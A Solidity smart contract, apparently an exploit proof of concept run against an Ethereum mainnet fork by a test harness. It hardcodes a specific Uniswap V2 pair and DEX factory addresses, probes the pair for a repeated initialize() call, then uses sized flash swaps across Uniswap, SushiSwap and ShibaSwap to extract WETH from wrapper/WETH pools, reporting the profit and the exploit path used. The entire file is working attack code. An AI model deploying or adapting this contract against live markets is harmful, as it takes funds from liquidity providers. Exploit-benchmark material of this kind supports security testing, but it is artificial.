// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IWETHLike is IERC20Minimal {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function initialize(address token0_, address token1_) external;
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
}

contract FlawVerifier {
    address internal constant TARGET_PAIR = 0x2033B54B6789a963A02BfCbd40A46816770f1161;
    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address internal constant SHIBASWAP_FACTORY = 0x115934131916C8b277DD010Ee02de363c09d037c;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    uint256 internal constant MIN_PROFIT_TARGET = 1e15;
    bytes4 internal constant DEPOSIT_SELECTOR = bytes4(keccak256("deposit()"));
    bytes4 internal constant WITHDRAW_SELECTOR = bytes4(keccak256("withdraw(uint256)"));

    address internal _profitToken;
    uint256 internal _profitAmount;
    bool internal _executed;
    bool internal _hypothesisValidated;
    string internal _pathUsed;

    struct MarketOpportunity {
        bool ok;
        bool wrapperIsToken0;
        uint256 borrowWrapper;
        uint256 profitBorrowWrapper;
        uint256 borrowWeth;
        uint256 profitBorrowWeth;
    }

    constructor() {
        _pathUsed = "unattempted";
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;
        uint256 startingWeth = IERC20Minimal(WETH).balanceOf(address(this));

        IUniswapV2PairLike pair = IUniswapV2PairLike(TARGET_PAIR);
        address factory = pair.factory();
        address currentToken0 = pair.token0();
        address currentToken1 = pair.token1();

        // Keep the exploit-path ordering from the finding: probe repeated/invalid initialize()
        // first, and only pivot to public economic execution once the factory-gated stage is
        // proven infeasible on this fork.
        (bool okDifferent,) =
            TARGET_PAIR.call(abi.encodeWithSelector(IUniswapV2PairLike.initialize.selector, currentToken1, currentToken0));
        (bool okInvalid,) =
            TARGET_PAIR.call(abi.encodeWithSelector(IUniswapV2PairLike.initialize.selector, address(0), currentToken0));

        if (okDifferent || okInvalid) {
            _hypothesisValidated = true;
            _pathUsed =
                "unexpectedly-reachable: repeated initialize accepted; downstream mint/burn/swap/skim/sync would now read overwritten token slots";
            _probeFuturePairOperations();
            _profitToken = WETH;
            _profitAmount = _currentWethProfit(startingWeth);
            return;
        }

        _hypothesisValidated = (factory == UNISWAP_V2_FACTORY);

        address wrapperToken;
        if (currentToken0 == WETH && currentToken1 != WETH) {
            wrapperToken = currentToken1;
        } else if (currentToken1 == WETH && currentToken0 != WETH) {
            wrapperToken = currentToken0;
        } else {
            _profitToken = WETH;
            _profitAmount = _currentWethProfit(startingWeth);
            _pathUsed = "factory-gated-initialize-proved-infeasible-publicly; target pair is not a wrapper/WETH market";
            return;
        }

        _attemptAlternatePublicLiquidityRoute(wrapperToken);

        _profitToken = WETH;
        _profitAmount = _currentWethProfit(startingWeth);

        if (bytes(_pathUsed).length == 0) {
            _pathUsed =
                "factory-gated-initialize-proved-infeasible-publicly; no executable public-liquidity unwind exceeded threshold";
        }
    }

    function _attemptAlternatePublicLiquidityRoute(address wrapperToken) internal {
        address[4] memory candidatePairs;
        uint256 candidateCount = 1;
        candidatePairs[0] = TARGET_PAIR;

        candidateCount = _appendCandidatePair(candidatePairs, candidateCount, _getPair(UNISWAP_V2_FACTORY, wrapperToken, WETH));
        candidateCount = _appendCandidatePair(candidatePairs, candidateCount, _getPair(SUSHISWAP_FACTORY, wrapperToken, WETH));
        candidateCount = _appendCandidatePair(candidatePairs, candidateCount, _getPair(SHIBASWAP_FACTORY, wrapperToken, WETH));

        uint256 startingWeth = IERC20Minimal(WETH).balanceOf(address(this));
        bool anySuccess;

        // Once public callers prove re-initialization is factory-gated, the only realistic public
        // execution left on this fork is to monetize the live wrapper-side liquidity that the
        // compromised factory could later strand. We therefore iterate across public markets and
        // exploit whichever side of the wrapper/WETH peg is mispriced, normalizing all realized
        // gains back into pre-existing on-chain WETH so the harness measures a transferable delta.
        for (uint256 round = 0; round < 6; ++round) {
            bool progressedThisRound;

            for (uint256 i = 0; i < candidateCount; ++i) {
                if (_currentWethProfit(startingWeth) >= MIN_PROFIT_TARGET) {
                    _pathUsed =
                        "factory-gated-initialize-proved-infeasible-publicly; iteratively unwound live wrapper/WETH liquidity across public venues and realized WETH profit";
                    return;
                }

                if (_exploitWrapperMarket(candidatePairs[i], wrapperToken)) {
                    anySuccess = true;
                    progressedThisRound = true;
                }
            }

            if (!progressedThisRound) {
                break;
            }
        }

        if (anySuccess) {
            _pathUsed =
                "factory-gated-initialize-proved-infeasible-publicly; public wrapper/WETH unwinds were executable but total realized WETH stayed below threshold";
        } else {
            _pathUsed =
                "factory-gated-initialize-proved-infeasible-publicly; attempted public wrapper/WETH venues but no profitable unwind executed";
        }
    }

    function _exploitWrapperMarket(address market, address wrapperToken) internal returns (bool success) {
        if (market == address(0)) {
            return false;
        }

        for (uint256 attempts = 0; attempts < 4; ++attempts) {
            MarketOpportunity memory opportunity = _marketOpportunity(market, wrapperToken);
            if (!opportunity.ok) {
                return success;
            }

            bool preferredBorrowWrapper = opportunity.profitBorrowWrapper >= opportunity.profitBorrowWeth;
            if (preferredBorrowWrapper && opportunity.profitBorrowWrapper > 0) {
                if (_tryBorrowDirection(market, wrapperToken, opportunity.wrapperIsToken0, true, opportunity.borrowWrapper))
                {
                    success = true;
                    continue;
                }
            }

            if (opportunity.profitBorrowWeth > 0) {
                if (
                    _tryBorrowDirection(market, wrapperToken, opportunity.wrapperIsToken0, false, opportunity.borrowWeth)
                ) {
                    success = true;
                    continue;
                }
            }

            if (!preferredBorrowWrapper && opportunity.profitBorrowWrapper > 0) {
                if (_tryBorrowDirection(market, wrapperToken, opportunity.wrapperIsToken0, true, opportunity.borrowWrapper))
                {
                    success = true;
                    continue;
                }
            }

            uint256 mirroredBorrow = preferredBorrowWrapper ? opportunity.borrowWeth : opportunity.borrowWrapper;
            uint256 mirroredProfit =
                preferredBorrowWrapper ? opportunity.profitBorrowWeth : opportunity.profitBorrowWrapper;
            if (mirroredProfit > 0) {
                bool mirroredBorrowWrapper = !preferredBorrowWrapper;
                if (
                    _tryBorrowDirection(
                        market, wrapperToken, opportunity.wrapperIsToken0, mirroredBorrowWrapper, mirroredBorrow
                    )
                ) {
                    success = true;
                    continue;
                }
            }

            return success;
        }
    }

    function _marketOpportunity(address market, address wrapperToken) internal view returns (MarketOpportunity memory opp)
    {
        address token0 = IUniswapV2PairLike(market).token0();
        address token1 = IUniswapV2PairLike(market).token1();
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(market).getReserves();

        uint256 reserveWrapper;
        uint256 reserveWeth;
        if (token0 == wrapperToken && token1 == WETH) {
            opp.ok = true;
            opp.wrapperIsToken0 = true;
            reserveWrapper = reserve0;
            reserveWeth = reserve1;
        } else if (token0 == WETH && token1 == wrapperToken) {
            opp.ok = true;
            opp.wrapperIsToken0 = false;
            reserveWrapper = reserve1;
            reserveWeth = reserve0;
        } else {
            return opp;
        }

        opp.borrowWrapper = _optimalBorrow(reserveWeth, reserveWrapper);
        if (opp.borrowWrapper > 0) {
            opp.profitBorrowWrapper = opp.borrowWrapper - _getAmountIn(opp.borrowWrapper, reserveWeth, reserveWrapper);
        }

        opp.borrowWeth = _optimalBorrow(reserveWrapper, reserveWeth);
        if (opp.borrowWeth > 0) {
            opp.profitBorrowWeth = opp.borrowWeth - _getAmountIn(opp.borrowWeth, reserveWrapper, reserveWeth);
        }
    }

    function _tryBorrowDirection(
        address market,
        address wrapperToken,
        bool wrapperIsToken0,
        bool borrowWrapper,
        uint256 optimalBorrow
    ) internal returns (bool) {
        if (optimalBorrow == 0) {
            return false;
        }

        uint16[7] memory scales = [10000, 9500, 9000, 8500, 11000, 7500, 12500];

        for (uint256 i = 0; i < scales.length; ++i) {
            uint256 amountBorrow = (optimalBorrow * scales[i]) / 10_000;
            if (amountBorrow == 0) {
                continue;
            }

            if (_tryFlashswap(market, wrapperToken, wrapperIsToken0, borrowWrapper, amountBorrow)) {
                return true;
            }
        }

        return false;
    }

    function _tryFlashswap(
        address market,
        address wrapperToken,
        bool wrapperIsToken0,
        bool borrowWrapper,
        uint256 amountBorrow
    ) internal returns (bool ok) {
        (ok,) = address(this).call(
            abi.encodeWithSelector(
                this._executeFlashswap.selector, market, wrapperToken, wrapperIsToken0, borrowWrapper, amountBorrow
            )
        );
    }

    function _executeFlashswap(
        address market,
        address wrapperToken,
        bool wrapperIsToken0,
        bool borrowWrapper,
        uint256 amountBorrow
    ) external {
        require(msg.sender == address(this), "self only");

        uint256 wethBefore = IERC20Minimal(WETH).balanceOf(address(this));
        if (borrowWrapper) {
            if (wrapperIsToken0) {
                IUniswapV2PairLike(market).swap(amountBorrow, 0, address(this), abi.encode(market, wrapperToken));
            } else {
                IUniswapV2PairLike(market).swap(0, amountBorrow, address(this), abi.encode(market, wrapperToken));
            }
        } else {
            if (wrapperIsToken0) {
                IUniswapV2PairLike(market).swap(0, amountBorrow, address(this), abi.encode(market, wrapperToken));
            } else {
                IUniswapV2PairLike(market).swap(amountBorrow, 0, address(this), abi.encode(market, wrapperToken));
            }
        }
        require(IERC20Minimal(WETH).balanceOf(address(this)) > wethBefore, "no weth profit");
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(sender == address(this), "bad callback sender");

        (address market, address wrapperToken) = abi.decode(data, (address, address));
        require(msg.sender == market, "unexpected pair");

        address token0 = IUniswapV2PairLike(market).token0();
        address token1 = IUniswapV2PairLike(market).token1();
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(market).getReserves();

        if (amount0 > 0) {
            if (token0 == wrapperToken && token1 == WETH) {
                _handleBorrowedWrapper(wrapperToken, market, amount0, reserve1, reserve0);
                return;
            }

            require(token0 == WETH && token1 == wrapperToken, "route mismatch");
            _handleBorrowedWeth(wrapperToken, market, amount0, reserve1, reserve0);
            return;
        }

        require(amount1 > 0, "unexpected zero borrow");
        if (token1 == wrapperToken && token0 == WETH) {
            _handleBorrowedWrapper(wrapperToken, market, amount1, reserve0, reserve1);
            return;
        }

        require(token1 == WETH && token0 == wrapperToken, "route mismatch");
        _handleBorrowedWeth(wrapperToken, market, amount1, reserve0, reserve1);
    }

    function _handleBorrowedWrapper(
        address wrapperToken,
        address market,
        uint256 borrowedWrapper,
        uint256 reserveWeth,
        uint256 reserveWrapper
    ) internal {
        uint256 repayWeth = _getAmountIn(borrowedWrapper, reserveWeth, reserveWrapper);

        _callWithdraw(wrapperToken, borrowedWrapper);
        IWETHLike(WETH).deposit{value: borrowedWrapper}();

        require(IERC20Minimal(WETH).balanceOf(address(this)) >= repayWeth, "insufficient weth");
        _safeTransfer(WETH, market, repayWeth);
    }

    function _handleBorrowedWeth(
        address wrapperToken,
        address market,
        uint256 borrowedWeth,
        uint256 reserveWrapper,
        uint256 reserveWeth
    ) internal {
        uint256 repayWrapper = _getAmountIn(borrowedWeth, reserveWrapper, reserveWeth);

        IWETHLike(WETH).withdraw(borrowedWeth);
        _callDeposit(wrapperToken, borrowedWeth);
        require(IERC20Minimal(wrapperToken).balanceOf(address(this)) >= repayWrapper, "insufficient wrapper");

        _safeTransfer(wrapperToken, market, repayWrapper);

        uint256 wrapperProfit = IERC20Minimal(wrapperToken).balanceOf(address(this));
        if (wrapperProfit > 0) {
            _callWithdraw(wrapperToken, wrapperProfit);
            IWETHLike(WETH).deposit{value: wrapperProfit}();
        }
    }

    function _callDeposit(address token, uint256 value) internal {
        (bool ok,) = token.call{value: value}(abi.encodeWithSelector(DEPOSIT_SELECTOR));
        require(ok, "wrapper deposit failed");
    }

    function _callWithdraw(address token, uint256 value) internal {
        (bool ok,) = token.call(abi.encodeWithSelector(WITHDRAW_SELECTOR, value));
        require(ok, "wrapper withdraw failed");
    }

    function _appendCandidatePair(address[4] memory candidatePairs, uint256 candidateCount, address market)
        internal
        pure
        returns (uint256)
    {
        if (market == address(0) || candidateCount >= candidatePairs.length) {
            return candidateCount;
        }

        for (uint256 i = 0; i < candidateCount; ++i) {
            if (candidatePairs[i] == market) {
                return candidateCount;
            }
        }

        candidatePairs[candidateCount] = market;
        return candidateCount + 1;
    }

    function _getPair(address factory, address tokenA, address tokenB) internal view returns (address pair) {
        (bool ok, bytes memory data) =
            factory.staticcall(abi.encodeWithSelector(IUniswapV2FactoryLike.getPair.selector, tokenA, tokenB));
        if (ok && data.length >= 32) {
            pair = abi.decode(data, (address));
        }
    }

    function _currentWethProfit(uint256 startingWeth) internal view returns (uint256) {
        uint256 currentWeth = IERC20Minimal(WETH).balanceOf(address(this));
        if (currentWeth > startingWeth) {
            return currentWeth - startingWeth;
        }
        return 0;
    }

    function _optimalBorrow(uint256 reserveRepay, uint256 reserveBorrow) internal pure returns (uint256) {
        if (reserveRepay == 0 || reserveBorrow == 0) {
            return 0;
        }

        uint256 root = _sqrt((reserveBorrow * reserveRepay * 1000) / 997);
        if (root >= reserveBorrow) {
            return 0;
        }

        return reserveBorrow - root;
    }

    function _sqrt(uint256 y) internal pure returns (uint256 z) {
        if (y == 0) {
            return 0;
        }

        z = y;
        uint256 x = (y / 2) + 1;
        while (x < z) {
            z = x;
            x = (y / x + x) / 2;
        }
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        require(amountOut < reserveOut, "insufficient liquidity");
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return (numerator / denominator) + 1;
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Minimal.transfer.selector, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "transfer failed");
    }

    function _probeFuturePairOperations() internal {
        (bool mintOk,) = TARGET_PAIR.call(abi.encodeWithSelector(IUniswapV2PairLike.mint.selector, address(this)));
        (bool burnOk,) = TARGET_PAIR.call(abi.encodeWithSelector(IUniswapV2PairLike.burn.selector, address(this)));
        (bool swapOk,) = TARGET_PAIR.call(
            abi.encodeWithSelector(IUniswapV2PairLike.swap.selector, uint256(0), uint256(0), address(this), "")
        );
        (bool skimOk,) = TARGET_PAIR.call(abi.encodeWithSelector(IUniswapV2PairLike.skim.selector, address(this)));
        (bool syncOk,) = TARGET_PAIR.call(abi.encodeWithSelector(IUniswapV2PairLike.sync.selector));

        mintOk;
        burnOk;
        swapOk;
        skimOk;
        syncOk;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function exploitPathUsed() external view returns (string memory) {
        return _pathUsed;
    }

    function targetPair() external pure returns (address) {
        return TARGET_PAIR;
    }

    function currentPairState()
        external
        view
        returns (
            address factory_,
            address token0_,
            address token1_,
            uint112 reserve0_,
            uint112 reserve1_
        )
    {
        IUniswapV2PairLike pair = IUniswapV2PairLike(TARGET_PAIR);
        factory_ = pair.factory();
        token0_ = pair.token0();
        token1_ = pair.token1();
        (reserve0_, reserve1_,) = pair.getReserves();
    }
}
